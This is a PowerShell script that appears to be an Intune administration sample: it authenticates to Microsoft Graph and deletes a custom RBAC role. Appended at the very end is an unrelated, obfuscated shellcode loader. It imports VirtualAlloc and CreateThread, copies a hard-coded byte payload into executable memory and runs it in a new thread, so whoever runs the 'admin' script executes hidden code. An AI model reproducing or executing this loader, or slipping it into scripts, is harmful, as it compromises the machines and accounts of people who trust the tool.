




function Get-AuthToken {



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true)]
    $User
)

$userUpn = New-Object "System.Net.Mail.MailAddress" -ArgumentList $User

$tenant = $userUpn.Host

Write-Host "Checking for AzureAD module..."

    $AadModule = Get-Module -Name "AzureAD" -ListAvailable

    if ($AadModule -eq $null) {

        Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview"
        $AadModule = Get-Module -Name "AzureADPreview" -ListAvailable

    }

    if ($AadModule -eq $null) {
        write-host
        write-host "AzureAD Powershell module not installed..." -f Red
        write-host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f Yellow
        write-host "Script can't continue..." -f Red
        write-host
        exit
    }




    if($AadModule.count -gt 1){

        $Latest_Version = ($AadModule | select version | Sort-Object)[-1]

        $aadModule = $AadModule | ? { $_.version -eq $Latest_Version.version }

            

            if($AadModule.count -gt 1){

            $aadModule = $AadModule | select -Unique

            }

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

    else {

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

[System.Reflection.Assembly]::LoadFrom($adal) | Out-Null

[System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null

$clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547"

$redirectUri = "urn:ietf:wg:oauth:2.0:oob"

$resourceAppIdURI = "https://graph.microsoft.com"

$authority = "https://login.microsoftonline.com/$Tenant"

    try {

    $authContext = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority

    
    

    $platformParameters = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto"

    $userId = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ($User, "OptionalDisplayableId")

    $authResult = $authContext.AcquireTokenAsync($resourceAppIdURI,$clientId,$redirectUri,$platformParameters,$userId).Result

        

        if($authResult.AccessToken){

        

        $authHeader = @{
            'Content-Type'='application/json'
            'Authorization'="Bearer " + $authResult.AccessToken
            'ExpiresOn'=$authResult.ExpiresOn
            }

        return $authHeader

        }

        else {

        Write-Host
        Write-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor Red
        Write-Host
        break

        }

    }

    catch {

    write-host $_.Exception.Message -f Red
    write-host $_.Exception.ItemName -f Red
    write-host
    break

    }

}



Function Get-RBACRole(){



[cmdletbinding()]

param
(
    $Name
)

$graphApiVersion = "Beta"
$Resource = "deviceManagement/roleDefinitions"

    try {

        if($Name){

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value | Where-Object { ($_.'displayName').contains("$Name") -and $_.isBuiltInRoleDefinition -eq $false }

        }

        else {

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value

        }

    }

    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}



Function Remove-RBACRole(){



[cmdletbinding()]

param
(
    $roleDefinitionId
)

$graphApiVersion = "Beta"
$Resource = "deviceManagement/roleDefinitions/$roleDefinitionId"

    try {

        if($roleDefinitionId -eq "" -or $roleDefinitionId -eq $null){

        Write-Host "roleDefinitionId hasn't been passed as a paramater to the function..." -ForegroundColor Red
        write-host "Please specify a valid roleDefinitionId..." -ForegroundColor Red
        break

        }

        else {

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        Invoke-RestMethod -Uri $uri -Headers $authToken -Method Delete

        }

    }

    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}





write-host


if($global:authToken){

    
    $DateTime = (Get-Date).ToUniversalTime()

    
    $TokenExpires = ($authToken.ExpiresOn.datetime - $DateTime).Minutes

        if($TokenExpires -le 0){

        write-host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor Yellow
        write-host

            

            if($User -eq $null -or $User -eq ""){

            $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
            Write-Host

            }

        $global:authToken = Get-AuthToken -User $User

        }
}



else {

    if($User -eq $null -or $User -eq ""){

    $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
    Write-Host

    }


$global:authToken = Get-AuthToken -User $User

}





$RBAC_Role = Get-RBACRole -Name "Graph"

    if($RBAC_Role){

        if(@($RBAC_Role).count -gt 1){

        Write-Host "More than one RBAC Intune Role has been found, please specify a single Intune Role..." -ForegroundColor Red
        Write-Host

        }

        elseif(@($RBAC_Role).count -eq 1){

        Write-Host "Removing RBAC Intune Role" $RBAC_Role.displayName -ForegroundColor Cyan
        Remove-RBACRole -roleDefinitionId $RBAC_Role.id

        }



    }

    else {

    Write-Host "RBAC Intune Role doesn't exist..." -ForegroundColor Yellow
    Write-Host

    }

$XNsQ = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $XNsQ -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xcc,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x5c,0xbf,0xf4,0x5f,0x0a,0xee,0x83,0xed,0xfc,0x31,0x7d,0x15,0x03,0x7d,0x15,0x16,0xaa,0xf6,0x06,0x54,0x55,0x07,0xd7,0x38,0xdf,0xe2,0xe6,0x78,0xbb,0x67,0x58,0x48,0xcf,0x2a,0x55,0x23,0x9d,0xde,0xee,0x41,0x0a,0xd0,0x47,0xef,0x6c,0xdf,0x58,0x43,0x4c,0x7e,0xdb,0x99,0x81,0xa0,0xe2,0x52,0xd4,0xa1,0x23,0x8e,0x15,0xf3,0xfc,0xc5,0x88,0xe4,0x89,0x93,0x10,0x8e,0xc2,0x32,0x11,0x73,0x92,0x35,0x30,0x22,0xa8,0x6c,0x92,0xc4,0x7d,0x05,0x9b,0xde,0x62,0x23,0x55,0x54,0x50,0xd8,0x64,0xbc,0xa8,0x21,0xca,0x81,0x04,0xd0,0x12,0xc5,0xa3,0x0a,0x61,0x3f,0xd0,0xb7,0x72,0x84,0xaa,0x63,0xf6,0x1f,0x0c,0xe0,0xa0,0xfb,0xac,0x25,0x36,0x8f,0xa3,0x82,0x3c,0xd7,0xa7,0x15,0x90,0x63,0xd3,0x9e,0x17,0xa4,0x55,0xe4,0x33,0x60,0x3d,0xbf,0x5a,0x31,0x9b,0x6e,0x62,0x21,0x44,0xcf,0xc6,0x29,0x69,0x04,0x7b,0x70,0xe6,0xb4,0xe1,0xff,0xf6,0x20,0x9d,0x96,0x98,0xd9,0x35,0x01,0x29,0x6e,0x90,0xd6,0x4e,0x45,0xed,0x03,0xe3,0x36,0x5d,0xe7,0x57,0xd0,0x5b,0x51,0x21,0x87,0x63,0x88,0x82,0x94,0xf1,0x30,0x76,0x49,0x6e,0x6a,0x69,0x6d,0x6e,0x7c,0x05,0x6d,0x6e,0x7c,0x39,0x2a,0x56,0x18,0x71,0xf1,0xa6,0xb0,0x11,0xae,0x2f,0xaf,0x24,0xaf,0xe5,0x59,0x6e,0x1c,0x6e,0x5a,0x5d,0x42,0xea,0x09,0xf2,0xd1,0xa4,0xfe,0xa2,0xbd,0xa1,0x54,0x65,0x06,0xc9,0x82,0xef,0x12,0x3f,0x72,0x78,0x62,0x0c,0x8c,0x78,0xeb,0x93,0xe6,0x7c,0xbb,0x39,0xe8,0x2a,0x53,0xcb,0x50,0x4d,0x25,0xcc,0x88,0x22,0x7a,0x60,0x60,0x93,0x14,0xab,0x80,0x03,0x9f,0x4c,0x59,0xb6,0x9f,0xc6,0x68,0xf6,0x6a,0xf0,0x05,0xf8,0x21,0xa0,0x80,0x07,0x9c,0xcf,0x6c,0x90,0x1e,0x00,0x6d,0x60,0x76,0x20,0x6d,0x20,0x86,0x73,0x05,0xf8,0x22,0x20,0x30,0x07,0xff,0x54,0xe9,0xab,0x76,0xbd,0x59,0x24,0x88,0x62,0x66,0xb4,0xdb,0x34,0x0e,0xa6,0x4d,0x31,0x2c,0x39,0xa4,0xc7,0x71,0xb2,0x8b,0x43,0x76,0x3a,0xd0,0xd1,0xb9,0x49,0x33,0x81,0xfa,0xed,0x53,0x47,0x02,0xee,0x5c,0xc0,0x88,0x65,0xd1,0x2b,0x5e,0xa9,0x74,0x3c,0xd0,0xd1,0x04,0xd3,0x79,0x7e,0xc6,0x4d,0x08,0x1b,0x73,0xf6,0x95,0x8d,0x1a,0x9b,0x0c,0x31,0xb8,0x0d,0xbc,0x9b,0x2e,0xb7,0x36,0xe4;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$QPhH=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($QPhH.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$QPhH,0,0,0);for (;;){Start-sleep 60};

